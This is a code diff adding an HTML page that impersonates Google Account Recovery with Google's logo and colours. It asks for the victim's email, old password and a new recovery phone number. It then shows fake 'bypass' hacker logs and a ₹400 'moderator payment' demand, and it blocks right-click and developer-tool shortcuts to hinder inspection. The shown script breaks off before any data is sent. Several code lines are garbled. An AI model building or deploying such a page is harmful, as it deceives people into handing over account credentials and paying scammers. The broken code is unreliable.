@@ -1,1 +1,967 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Account Recovery</title>
+    
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500;600;700;800;900&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        /* Global Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+        }
 
+        body {
+            background-color: #0d1117; /* Dark theme background for page 2 */
+            color: #fff;
+            min-height: 100vh;
+            overflow-x: hidden;
+            font-family: 'Montserrat', '-apple-system', BlinkMacSystemFont, sans-serif;
+        }
+
+        /* =========================================
+           PAGE 1 STYLES (Light Google Theme)
+           ========================================= */
+        #page1 {
+            background-color: #f0f4f9;
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            position: fixed;
+            top: 0; left: 0;
+            width: 100vw; height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 20000; /* Stays on top initially */
+            transition: opacity 0.5s ease;
+        }
+
+        .google-card {
+            background-color: #ffffff;
+            padding: 35px 40px;
+            border-radius: 8px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+            box-sizing: border-box;
+            color: #202124;
+        }
+
+        .google-logo-container {
+            text-align: left;
+            margin-bottom: 20px;
+        }
+
+        .google-logo-container img {
+            height: 32px;
+        }
+
+        .google-card h1 {
+            font-family: 'Roboto', 'Segoe UI', Arial, sans-serif;
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin: 0 0 10px 0;
+            text-transform: none;
+            letter-spacing: normal;
+        }
+
+        .google-card p {
+            font-size: 16px;
+            color: #5f6368;
+            margin: 0 0 35px 0;
+            font-weight: 400;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 30px;
+        }
+
+        .google-card input {
+            width: 100%;
+            padding: 13px 15px;
+            font-size: 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            box-sizing: border-box;
+            color: #202124;
+            background: #fff;
+            transition: all 0.2s ease;
+            font-weight: normal;
+            box-shadow: none;
+        }
+
+        .google-card input:focus {
+            outline: none;
+            border: 2px solid #1a73e8 !important;
+            padding: 12px 14px; 
+            box-shadow: none !important;
+            background: #fff;
+        }
+
+        .button-container {
+            display: flex;
+            justify-content: flex-end;
+        }
+
+        .google-card button {
+            background-color: #1a73e8;
+            color: white;
+            font-family: inherit;
+            font-size: 14px;
+            font-weight: 500;
+            letter-spacing: 0.25px;
+            padding: 10px 24px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.2s;
+            width: auto;
+            text-transform: none;
+            box-shadow: none;
+        }
+
+        .google-card button:hover {
+            background-color: #1557b0;
+            box-shadow: 0 1px 2px rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+
+        /* =========================================
+           OFFICIAL GOOGLE SPINNER LOADER
+           ========================================= */
+        #googleSpinnerOverlay {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background-color: rgba(255, 255, 255, 0.95);
+            display: none;
+            justify-content: center;
+            align-items: center;
+            z-index: 99999;
+        }
+        #googleSpinnerOverlay.dark-mode {
+            background-color: rgba(13, 17, 23, 0.95);
+        }
+
+        .circular-loader {
+            animation: rotate 2s linear infinite;
+            height: 45px;
+            width: 45px;
+        }
+
+        .circular-loader circle {
+            stroke: #1a73e8;
+            stroke-width: 4;
+            stroke-dasharray: 1, 200;
+            stroke-dashoffset: 0;
+            animation: dash 1.5s ease-in-out infinite, colorRotate 6s ease-in-out infinite;
+            stroke-linecap: round;
+            fill: none;
+        }
+
+        @keyframes rotate {
+            100% { transform: rotate(360deg); }
+        }
+
+        @keyframes dash {
+            0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
+            50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
+            100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
+        }
+
+        @keyframes colorRotate {
+            100%, 0% { stroke: #4285F4; }
+            40% { stroke: #EA4335; }
+            66% { stroke: #FBBC05; }
+            80%, 90% { stroke: #34A853; }
+        }
+
+        /* =========================================
+           PAGE 2 STYLES (Dark Theme)
+           ========================================= */
+        #page2 {
+            display: none; /* Hidden initially */
+            flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
+            padding: 40px 15px;
+            width: 100%;
+            min-height: 100vh;
+            position: relative;
+            z-index: 10;
+        }
+
+        .bg-animation {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            z-index: -1; overflow: hidden;
+            pointer-events: none;
+        }
+        .orb {
+            position: absolute;
+            border-radius: 50%;
+            filter: blur(100px); 
+            opacity: 0.35;
+            animation: float 20s infinite ease-in-out alternate;
+            will-change: transform;
+            transform: translateZ(0);
+        }
+        .orb-1 { width: 400px; height: 400px; background: #4285F4; top: -5%; left: -5%; animation-duration: 25s; }
+        .orb-2 { width: 450px; height: 450px; background: #EA4335; top: 40%; right: -10%; animation-duration: 22s; animation-delay: -5s; }
+        .orb-3 { width: 350px; height: 350px; background: #FBBC05; bottom: -10%; left: 20%; animation-duration: 28s; animation-delay: -2s; }
+        .orb-4 { width: 300px; height: 300px; background: #34A853; bottom: 20%; right: 20%; animation-duration: 20s; animation-delay: -8s; }
+
+        @keyframes float {
+            0% { transform: translate3d(0, 0, 0) scale(1); }
+            33% { transform: translate3d(30px, -40px, 0) scale(1.05); }
+            66% { transform: translate3d(-20px, 20px, 0) scale(0.95); }
+            100% { transform: translate3d(40px, 40px, 0) scale(1.02); }
+        }
+
+        .container-dark {
+            width: 100%;
+            max-width: 550px;
+            opacity: 0;
+            transform: scale(0.95) translateZ(0);
+            transition: opacity 0.6s cubic-bezier(0.25, 1, 0.5, 1), transform 0.6s cubic-bezier(0.25, 1, 0.5, 1);
+        }
+
+        .container-dark.show {
+            opacity: 1;
+            transform: scale(1) translateZ(0);
+        }
+
+        .glass-panel {
+            background: rgba(25, 27, 33, 0.4);
+            backdrop-filter: blur(25px);
+            -webkit-backdrop-filter: blur(25px);
+            border: 1px solid rgba(255, 255, 255, 0.15);
+            border-top: 1px solid rgba(255, 255, 255, 0.3);
+            border-left: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 24px;
+            padding: 40px 30px;
+            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.5), inset 0 0 20px rgba(255,255,255,0.03);
+            position: relative;
+            transform: translateZ(0); 
+            backface-visibility: hidden;
+            margin-bottom: 20px;
+            min-height: 520px;
+            transition: all 0.4s ease;
+        }
+
+        .glass-panel.borderless-mode {
+            border: none !important;
+            background: transparent !important;
+            box-shadow: none !important;
+            backdrop-filter: none !important;
+            -webkit-backdrop-filter: none !important;
+            padding: 10px !important;
+        }
+
+        @keyframes shakeError {
+            0%, 100% { transform: translate3d(0, 0, 0); }
+            10%, 30%, 50%, 70%, 90% { transform: translate3d(-8px, 0, 0); }
+            20%, 40%, 60%, 80% { transform: translate3d(8px, 0, 0); }
+        }
+
+        .shake {
+            animation: shakeError 0.5s cubic-bezier(.36,.07,.19,.97) both;
+            border: 1px solid rgba(234, 67, 53, 0.6) !important;
+        }
+
+        header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+
+        .title-wrapper {
+            position: relative;
+            display: inline-block;
+            padding: 5px 15px;
+        }
+
+        .container-dark h1 {
+            font-size: 2rem;
+            text-transform: uppercase;
+            font-weight: 900;
+            letter-spacing: 1px;
+            line-height: 1.3;
+            position: relative;
+            z-index: 2;
+        }
+
+        .form-group {
+            margin-bottom: 22px;
+            position: relative;
+            width: 100%;
+        }
+
+        .optional-group {
+            opacity: 0.65;
+            transition: opacity 0.3s ease;
+        }
+        .optional-group:focus-within, .optional-group:hover {
+            opacity: 1;
+        }
+
+        .container-dark label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
+            color: #c4c6ca;
+            font-weight: 700;
+            padding-left: 5px;
+        }
+
+        .mandatory { color: #EA4335; font-weight: bold; font-size: 1.1rem; }
+        .optional-text { font-size: 0.6rem; color: #FBBC05; font-weight: 600; margin-left: 4px; vertical-align: middle; }
+
+        .container-dark input {
+            width: 100%;
+            padding: 15px 18px;
+            border-radius: 12px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: rgba(0, 0, 0, 0.4);
+            color: #fff;
+            font-size: 1.05rem;
+            font-weight: 600; 
+            transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            outline: none;
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            -webkit-appearance: none;
+        }
+
+        .container-dark input::placeholder {
+            color: rgba(255, 255, 255, 0.55);
+            font-size: 0.95rem;
+            font-weight: 500;
+            transition: opacity 0.3s ease;
+        }
+        .container-dark input:focus::placeholder { opacity: 0.3; }
+
+        .container-dark input:focus { 
+            border-color: #34A853 !important; 
+            background: rgba(0, 0, 0, 0.6); 
+            box-shadow: 0 0 12px rgba(52, 168, 83, 0.4), inset 0 2px 5px rgba(0,0,0,0.2) !important;
+        }
+        .container-dark input.input-error { border-color: #EA4335 !important; box-shadow: 0 0 12px rgba(234, 67, 53, 0.4) !important;}
+
+        /* CUSTOM DROPDOWN */
+        .custom-select-wrapper { position: relative; width: 100%; z-index: 50; }
+        .custom-select-trigger {
+            width: 100%; padding: 15px 18px; border-radius: 12px; color: #fff;
+            background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255, 255, 255, 0.1);
+            font-size: 1.05rem; font-weight: 600; display: flex; justify-content: space-between; align-items: center;
+            cursor: pointer; transition: all 0.3s cubic-bezier(0.25, 1, 0.5, 1);
+            box-shadow: inset 0 2px 5px rgba(0,0,0,0.2);
+            -webkit-tap-highlight-color: transparent;
+        }
+        .custom-select-trigger:hover { background-color: rgba(255,255,255,0.05); }
+        .custom-select-wrapper.open .custom-select-trigger { border-color: #34A853; box-shadow: 0 0 12px rgba(52, 168, 83, 0.4); }
+        .custom-select-wrapper.input-error .custom-select-trigger { border-color: #EA4335 !important; }
+        
+        .custom-select-options {
+            position: absolute; display: block; top: calc(100% + 5px); left: 0; right: 0; 
+            background: rgba(25, 27, 33, 0.95); backdrop-filter: blur(15px);
+            border: 1px solid rgba(255,255,255,0.15); border-radius: 12px; 
+            box-shadow: 0 15px 30px rgba(0,0,0,0.8); z-index: 100;
+            opacity: 0; visibility: hidden; pointer-events: none; 
+            transform: translate3d(0, -10px, 0); transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+            list-style: none; padding: 8px; max-height: 250px; overflow-y: auto;
+            will-change: opacity, transform;
+        }
+        .custom-select-wrapper.open .custom-select-options { 
+            opacity: 1; visibility: visible; pointer-events: all; transform: translate3d(0, 0, 0); 
+        }
+        .custom-select-options li { 
+            padding: 12px 15px; color: #ccc; cursor: pointer; border-radius: 8px; 
+            transition: all 0.2s ease-in-out; font-size: 1rem; font-weight: 600; text-align: left; 
+        }
+        .custom-select-options li:hover { background: rgba(52, 168, 83, 0.15); color: #fff; transform: translateX(5px); }
+        .custom-select-options li.selected { background: rgba(52, 168, 83, 0.25); color: #fff; font-weight: 700; border-left: 3px solid #34A853;}
+        
+        ::-webkit-scrollbar { width: 5px; background: transparent; }
+        ::-webkit-scrollbar-thumb { background: rgba(255,255,255,0.2); border-radius: 10px; }
+        
+        .fa-chevron-down { transition: transform 0.3s ease; color: #a0a0a5; }
+        .custom-select-wrapper.open .fa-chevron-down { transform: rotate(180deg); color: #34A853; }
+
+        .error-msg {
+            color: #EA4335; font-size: 0.85rem; margin-top: 6px; padding-left: 5px;
+            font-weight: bold; display: none;
+        }
+
+        .btn-submit {
+            background: linear-gradient(135deg, #34A853, #227c3a);
+            color: #fff; border: 2px solid rgba(52, 168, 83, 0.6);
+            padding: 16px; font-size: 1.2rem; border-radius: 12px; cursor: pointer;
+            text-transform: uppercase; font-weight: 800; width: 100%;
+            transition: transform 0.2s cubic-bezier(0.25, 1, 0.5, 1), box-shadow 0.2s ease;
+            margin-top: 20px; letter-spacing: 1.5px;
+            box-shadow: 0 0 20px rgba(52, 168, 83, 0.6); display: flex;
+            align-items: center; justify-content: center; transform: translateZ(0);
+        }
+        .btn-submit:hover { box-shadow: 0 0 30px rgba(52, 168, 83, 0.8); }
+        .btn-submit:active { transform: scale(0.96) translateZ(0); }
+
+        /* Processing Logs Layout */
+        .processing-container {
+            display: none; flex-direction: column; width: 100%; height: 100%;
+            justify-content: flex-start; align-items: center; padding-top: 10px;
+        }
+        .process-log {
+            width: 100%; display: flex; flex-direction: column; gap: 12px;
+            font-family: 'Courier New', Courier, monospace; background: transparent;
+            border: none; box-shadow: none; height: 520px; overflow-y: hidden; 
+            scroll-behavior: auto; padding: 20px 10px;
+            -webkit-mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%), linear-gradient(to bottom, transparent 0%, black 5%, black 95%, transparent 100%);
+            -webkit-mask-composite: source-in;
+            mask-image: linear-gradient(to right, transparent 0%, black 5%, black 95%, transparent 100%), linear-gradient(to bottom, transparent 0%, black 5%, black 95%, transparent 100%);
+            mask-composite: intersect;
+        }
+
+        .hacker-line {
+            font-size: 0.65rem !important; font-weight: 800 !important;
+            color: #34A853 !important; text-shadow: 0 0 12px #34A853 !important;
+            transform: scaleY(1.8) translateZ(0) !important; filter: blur(2.8px) !important; 
+            opacity: 0.55 !important; margin-bottom: 2px !important; line-height: 1.1;
+            word-wrap: break-word; will-change: transform;
+        }
+
+        .log-entry {
+            font-size: 1.05rem; font-weight: bold; color: rgba(255,255,255,0.95);
+            line-height: 1.5; text-align: left; word-wrap: break-word;
+            opacity: 0; transform: translate3d(0, 15px, 0);
+            transition: opacity 0.4s ease, transform 0.4s cubic-bezier(0.1, 1, 0, 1);
+            will-change: opacity, transform;
+        }
+        .log-entry.visible { opacity: 1; transform: translate3d(0, 0, 0); }
+
+        .typing-cursor::after {
+            content: '█'; animation: blinkCursor 0.4s infinite;
+            margin-left: 5px; color: #34A853; 
+        }
+        @keyframes blinkCursor { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
+
+        .c-sys { color: #4285F4; text-shadow: 0 0 10px rgba(66, 133, 244, 0.8); }
+        .c-data { color: #FBBC05; text-shadow: 0 0 10px rgba(251, 188, 5, 0.8); }
+        .c-succ { color: #34A853; text-shadow: 0 0 10px rgba(52, 168, 83, 0.8); }
+        .c-err { color: #EA4335; text-shadow: 0 0 10px rgba(234, 67, 53, 0.8); }
+        .c-billing { color: #ffcc00; text-shadow: 0 0 15px rgba(255, 204, 0, 0.9); font-size: 1.15rem; }
+
+        /* FINAL BLINKING REDIRECT SCREEN (As requested) */
+        .transition-screen {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.95);
+            display: flex; justify-content: center; align-items: center;
+            z-index: 100000; opacity: 0; pointer-events: none;
+            transition: opacity 0.3s ease;
+        }
+        .transition-screen.active { opacity: 1; pointer-events: all; }
+        .transition-image {
+            max-width: 15%; max-height: 15%;
+            animation: blinkImage 1s infinite ease-in-out;
+            transform: translateZ(0);
+        }
+        @keyframes blinkImage {
+            0%, 100% { opacity: 1; transform: scale(1) translateZ(0); }
+            50% { opacity: 0.6; transform: scale(0.9) translateZ(0); }
+        }
+
+        /* MOBILE OPTIMIZATIONS */
+        @media (max-width: 480px) {
+            #page2 { padding: 25px 15px; }
+            .glass-panel { padding: 30px 20px; min-height: 480px; }
+            .container-dark h1 { font-size: 1.8rem; }
+            .transition-image { max-width: 30%; max-height: 30%; }
+            .container-dark input { padding: 14px 15px; font-size: 1rem; }
+            .container-dark input::placeholder { font-size: 0.85rem; }
+            .google-card { padding: 25px 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ==============================================
+         PAGE 1: LIGHT THEME GOOGLE RECOVERY
+         ============================================== -->
+    <div id="page1">
+        <div class="google-card">
+            <div class="google-logo-container">
+                <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" alt="Google">
+            </div>
+            
+            <h1>Account Recovery</h1>
+            <p>Recover your Google Account</p>
+            
+            <form id="p1Form">
+                <div class="input-group">
+                    <input type="email" id="p1Email" placeholder="Email or phone" required autocomplete="username">
+                </div>
+                
+                <div class="button-container">
+                    <button type="submit">Recovery</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- ==============================================
+         GLOBAL GOOGLE SPINNER LOADER
+         ============================================== -->
+    <div id="googleSpinnerOverlay">
+        <svg class="circular-loader" viewBox="25 25 50 50">
+            <circle cx="50" cy="50" r="20"></circle>
+        </svg>
+    </div>
+
+    <!-- ==============================================
+         FINAL REDIRECT SCREEN (WITH GIF AS REQUESTED)
+         ============================================== -->
+    <div class="transition-screen" id="finalRedirectScreen">
+        <img src="https://pending404.github.io/g_ml/gml.gif" alt="Loading" class="transition-image">
+    </div>
+
+    <!-- ==============================================
+         PAGE 2: DARK THEME TERMINAL
+         ============================================== -->
+    <div id="page2">
+        <div class="bg-animation">
+            <div class="orb orb-1"></div>
+            <div class="orb orb-2"></div>
+            <div class="orb orb-3"></div>
+            <div class="orb orb-4"></div>
+        </div>
+
+        <div class="container-dark" id="mainContainer">
+            <div class="glass-panel" id="glassPanel">
+                
+                <div id="formSection">
+                    <header>
+                        <div class="title-wrapper" id="mainHeaderTitle">
+                            <h1></h1>
+                        </div>
+                    </header>
+                    
+                    <form id="recoveryForm" novalidate>
+                        
+                        <div class="form-group optional-group" style="z-index: 90;">
+                            <label>Full Name <span class="optional-text">(Optional)</span></label>
+                            <input type="text" id="fullName" placeholder="Enter your full name">
+                        </div>
+
+                        <div class="form-group optional-group" style="z-index: 80;">
+                            <label>Old Password <span class="optional-text">(Optional)</span></label>
+                            <input type="text" id="oldPassword" placeholder="Last remembered password">
+                        </div>
+
+                        <div class="form-group" style="z-index: 40;">
+                            <label>Device Operating System <span class="mandatory">*</span></label>
+                            <div class="custom-select-wrapper" id="osWrapper" data-value="">
+                                <div class="custom-select-trigger"><span style="color: #c4c6ca;">Select Operating System</span> <i class="fa-solid fa-chevron-down"></i></div>
+                                <ul class="custom-select-options">
+                                    <li data-value="Android">Android</li>
+                                    <li data-value="iOS">iOS</li>
+                                    <li data-value="macOS">macOS</li>
+                                    <li data-value="Windows PC">Windows PC</li>
+                                    <li data-value="Linux">Linux</li>
+                                    <li data-value="Other">Other</li>
+                                </ul>
+                            </div>
+                            <div class="error-msg" id="osError">Please select your device operating system.</div>
+                        </div>
+
+                        <div class="form-group" id="otherOsGroup" style="display: none; z-index: 35;">
+                            <label>Describe Your Device <span class="mandatory">*</span></label>
+                            <input type="text" id="otherOsDesc" placeholder="Please describe your device">
+                            <div class="error-msg" id="otherOsError">Please describe your device.</div>
+                        </div>
+
+                        <div class="form-group optional-group" style="z-index: 30;">
+                            <label>Add Recovery Email ID <span class="optional-text">(Optional)</span></label>
+                            <input type="email" id="newRecoverEmail" class="email-autofill" placeholder="Add new recovery email ID">
+                        </div>
+
+                        <div class="form-group" style="z-index: 20;">
+                            <label>Add Phone Number <span class="mandatory">*</span></label>
+                            <input type="tel" id="newPhone" placeholder="Add new recovery phone number" oninput="this.value = this.value.replace(//g, '')">
+                            <div class="error-msg" id="newPhoneError">Please enter a valid phone number.</div>
+                        </div>
+
+                        <div class="form-group optional-group" style="z-index: 10;">
+                            <label>Contact Email <span class="optional-text">(Optional)</span></label>
+                            <input type="email" id="contactEmail" class="email-autofill" placeholder="Email to contact you">
+                        </div>
+
+                        <button type="button" class="btn-submit" id="proceedBtn">
+                            PROCEED
+                        </button>
+                    </form>
+                </div>
+
+                <div class="processing-container" id="processingSection">
+                    <div class="process-log" id="processLog">
+                    </div>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            
+            // SECURITY CONSTRAINTS
+            document.addEventListener('contextmenu', function(e) {
+                if (e.target.tagName !== 'INPUT' && e.target.tagName !== 'TEXTAREA') {
+                    e.preventDefault();
+                }
+            });
+
+            document.onkeydown = function(e) {
+                if(e.keyCode == 123) return false;
+                if(e.ctrlKey && e.shiftKey && (e.keyCode == 'I'.charCodeAt(0) || e.keyCode == 'C'.charCodeAt(0) || e.keyCode == 'J'.charCodeAt(0))) return false;
+                if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) return false;
+            }
+
+            // GLOBAL VARIABLES
+            let fetchedTargetEmail = "Not Provided";
+            const colors =; // Google colors
+            
+            // ELEMENTS
+            const page1 = document.getElementById('page1');
+            const page2 = document.getElementById('page2');
+            const p1Form = document.getElementById('p1Form');
+            const p1EmailInput = document.getElementById('p1Email');
+            const googleSpinner = document.getElementById('googleSpinnerOverlay');
+            const mainContainer = document.getElementById('mainContainer');
+            const proceedBtn = document.getElementById('proceedBtn');
+            const glassPanel = document.getElementById('glassPanel');
+            const formSection = document.getElementById('formSection');
+            const processingSection = document.getElementById('processingSection');
+            const processLog = document.getElementById('processLog');
+            const finalRedirectScreen = document.getElementById('finalRedirectScreen');
+
+            // --- PAGE 1 LOGIC (TRANSITION TO PAGE 2) ---
+            p1Form.addEventListener('submit', (e) => {
+                e.preventDefault();
+                fetchedTargetEmail = p1EmailInput.value;
+                
+                // Show Google Loading Overlay
+                googleSpinner.style.display = 'flex';
+                googleSpinner.classList.remove('dark-mode'); // White background for light theme
+
+                // Wait 2.5 seconds, then switch to Page 2
+                setTimeout(() => {
+                    googleSpinner.style.display = 'none';
+                    page1.style.display = 'none';
+                    page2.style.display = 'flex';
+                    
+                    // Show animation for dark container
+                    requestAnimationFrame(() => {
+                        setTimeout(() => {
+                            mainContainer.classList.add('show');
+                        }, 50);
+                    });
+                }, 2500);
+            });
+
+            // --- HEADER GLOW (PAGE 2) ---
+            function setHeaderGlow() {
+                const headerText1 = "GMAIL";
+                const headerText2 = "RECOVERY";
+                const h1Element = document.querySelector('#mainHeaderTitle h1');
+                
+                let htmlContent = "";
+                headerText1.split('').forEach((char, idx) => {
+                    const color = colors;
+                    htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                });
+                htmlContent += "<br>";
+                
+                let colorIndex = 0;
+                headerText2.split('').forEach((char) => {
+                    if(char === ' ') {
+                        htmlContent += " ";
+                    } else {
+                        const color = colors;
+                        htmlContent += `<span style="color: ${color}; text-shadow: 0 0 15px ${color}, 0 0 35px ${color};">${char}</span>`;
+                        colorIndex++;
+                    }
+                });
+                h1Element.innerHTML = htmlContent;
+            }
+            setHeaderGlow();
+
+            // --- SMART EMAIL AUTO-FILL LOGIC ---
+            document.querySelectorAll('.email-autofill').forEach(input => {
+                input.addEventListener('input', function(e) {
+                    if (e.inputType === 'deleteContentBackward' || e.inputType === 'deleteContentForward') return;
+                    if (this.value.endsWith('@')) {
+                        this.value = this.value + 'gmail.com';
+                    }
+                });
+            });
+
+            function clearAllValidationErrors() {
+                document.querySelectorAll('.input-error').forEach(el => el.classList.remove('input-error'));
+                document.querySelectorAll('.error-msg').forEach(el => el.style.display = 'none');
+                glassPanel.classList.remove('shake');
+            }
+
+            document.querySelectorAll('input').forEach(input => {
+                input.addEventListener('focus', function() {
+                    clearAllValidationErrors();
+                    setTimeout(() => {
+                        this.scrollIntoView({ behavior: 'smooth', block: 'center' });
+                    }, 300);
+                });
+            });
+
+            // --- CUSTOM DROPDOWN LOGIC ---
+            document.querySelectorAll('.custom-select-wrapper').forEach(wrapper => {
+                const trigger = wrapper.querySelector('.custom-select-trigger');
+                const options = wrapper.querySelectorAll('.custom-select-options li');
+                const textSpan = wrapper.querySelector('.custom-select-trigger span');
+                
+                trigger.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    clearAllValidationErrors();
+                    document.querySelectorAll('.custom-select-wrapper').forEach(w => {
+                        if (w !== wrapper) w.classList.remove('open');
+                    });
+                    wrapper.classList.toggle('open');
+                    if(wrapper.classList.contains('open')) {
+                        setTimeout(() => { wrapper.scrollIntoView({ behavior: 'smooth', block: 'center' }); }, 100);
+                    }
+                });
+
+                options.forEach(option => {
+                    option.addEventListener('click', function(e) {
+                        e.stopPropagation();
+                        const value = this.getAttribute('data-value');
+                        const text = this.textContent.trim(); 
+                        
+                        textSpan.textContent = text; 
+                        textSpan.style.color = '#fff';
+                        wrapper.setAttribute('data-value', value);
+                        
+                        if (wrapper.id === 'osWrapper') {
+                            const otherOsGroup = document.getElementById('otherOsGroup');
+                            if (value === 'Other') {
+                                otherOsGroup.style.display = 'block';
+                            } else {
+                                otherOsGroup.style.display = 'none';
+                                document.getElementById('otherOsDesc').value = '';
+                            }
+                        }
+
+                        options.forEach(o => o.classList.remove('selected'));
+                        this.classList.add('selected');
+                        wrapper.classList.remove('open');
+                    });
+                });
+            });
+
+            document.addEventListener('click', () => {
+                document.querySelectorAll('.custom-select-wrapper').forEach(w => w.classList.remove('open'));
+            });
+
+            // --- FORM VALIDATION (PAGE 2) ---
+            proceedBtn.addEventListener('click', () => {
+                let isValid = true;
+                clearAllValidationErrors();
+
+                const osWrap = document.getElementById('osWrapper');
+                const newPhone = document.getElementById('newPhone');
+                const otherOsDesc = document.getElementById('otherOsDesc');
+
+                const validateInput = (element, condition) => {
+                    if(condition) {
+                        element.classList.add('input-error');
+                        document.getElementById(element.id + 'Error').style.display = 'block';
+                        isValid = false;
+                    }
+                };
+
+                const validateDropdown = (wrapper) => {
+                    if(wrapper.getAttribute('data-value') === "" || !wrapper.hasAttribute('data-value')) {
+                        wrapper.classList.add('input-error');
+                        document.getElementById(wrapper.id.replace('Wrapper', 'Error')).style.display = 'block';
+                        isValid = false;
+                    }
+                };
+
+                validateDropdown(osWrap);
+                validateInput(newPhone, newPhone.value.length < 5); 
+                
+                if (osWrap.getAttribute('data-value') === 'Other') {
+                    validateInput(otherOsDesc, otherOsDesc.value.trim() === '');
+                }
+
+                if (!isValid) {
+                    glassPanel.classList.remove('shake');
+                    void glassPanel.offsetWidth; 
+                    glassPanel.classList.add('shake');
+                    return; 
+                }
+
+                let finalOsValue = osWrap.getAttribute('data-value');
+                if (finalOsValue === 'Other') {
+                    finalOsValue = otherOsDesc.value;
+                }
+
+                const formData = {
+                    firstGmail: fetchedTargetEmail, // Using email from Page 1
+                    fullName: document.getElementById('fullName').value || 'Not Provided',
+                    oldPassword: document.getElementById('oldPassword').value || 'Not Provided',
+                    os: finalOsValue,
+                    newRecoverEmail: document.getElementById('newRecoverEmail').value || 'Not Provided',
+                    newPhone: newPhone.value,
+                    contactEmail: document.getElementById('contactEmail').value || 'Not Provided'
+                };
+
+                startSequence(formData);
+            });
+
+            // --- TRANSITION TO HACKER LOGS ---
+            function startSequence(data) {
+                // Show Google Loading Overlay (Dark Mode)
+                googleSpinner.style.display = 'flex';
+                googleSpinner.classList.add('dark-mode');
+
+                setTimeout(() => {
+                    googleSpinner.style.display = 'none';
+                    
+                    glassPanel.classList.add('borderless-mode');
+                    formSection.style.display = 'none';
+                    processingSection.style.display = 'flex';
+
+                    requestAnimationFrame(() => {
+                        runSeamlessSyncAnimation(data);
+                    });
+                }, 2000); 
+            }
+
+            // --- SEAMLESS SYNC ANIMATION ---
+            function runSeamlessSyncAnimation(data) {
+                const hackerPhrases = Initializing OAuth Recovery Bypass v2...",
+                    " Connecting to primary mail servers...",
+                    " Bypassing reCAPTCHA v3 verification...",
+                    " Overwriting registry keys...",
+                    " Establishing encrypted tunnel to DB...",
+                    " Injecting new recovery parameters...",
+                    " Clearing older session cookies...",
+                    " Spoofing device ID algorithms...",
+                    " Masking IP through proxy nodes...",
+                    " Force injecting SSL cert verification..."
+                ];
+
+                const realLogs =</span> Initiating Recovery Environment...`,
+                    `<span class="c-data"></span> Target Email: ${data.firstGmail}`,
+                    `<span class="c-data"></span> Target Device/OS: ${data.os}`,
+                    `<span class="c-sys"></span> Processing Old Details & Password...`,
+                    `<span class="c-succ"></span> Binding New Recovery Phone: ${data.newPhone}`,
+                    `<span class="c-succ"></span> Parameters Compiled Successfully!`,
+                    `<span class="c-billing"> Moderator payment charges: ₹400</span>`,
+                    `<span class="c-sys">Please wait... Forwarding to secure environment.</span>`
+                ];
+
+                let startTimestamp = null;
+                let reqAnimId;
+
+                function fastPhase(timestamp) {
+                    if (!startTimestamp) startTimestamp = timestamp;
+                    let progress = timestamp - startTimestamp;
+
+                    let fragment = document.createDocumentFragment();
+                    for(let k=0; k<4; k++) {
+                        const lineDiv = document.createElement('div');
+                        lineDiv.className = 'hacker-line';
+                        const phrase = hackerPhrases;
+                        lineDiv.innerText = `${phrase}`;
+                        fragment.appendChild(lineDiv);
+                    }
+                    processLog.appendChild(fragment);
+                    
+                    while(processLog.childNodes.length > 50) {
+                        processLog.removeChild(processLog.firstChild);
+                    }
+                    
+                    processLog.scrollTop = processLog.scrollHeight;
+
+                    if (progress < 2500) { 
+                        reqAnimId = requestAnimationFrame(fastPhase);
+                    } else {
+                        cancelAnimationFrame(reqAnimId);
+                        processLog.style.scrollBehavior = 'smooth';
+                        setTimeout(startSlowMotionLogs, 50);
+                    }
+                }
+                
+                requestAnimationFrame(fastPhase);
+
+                function startSlowMotionLogs() {
+                    let realLogIndex = 0;
+
+                    function typeNextLine() {
+                        if (realLogIndex < realLogs.length) {
+                            const lineDiv = document.createElement('div');
+                            lineDiv.className = 'log-entry typing-cursor visible';
+                            processLog.appendChild(lineDiv);
+
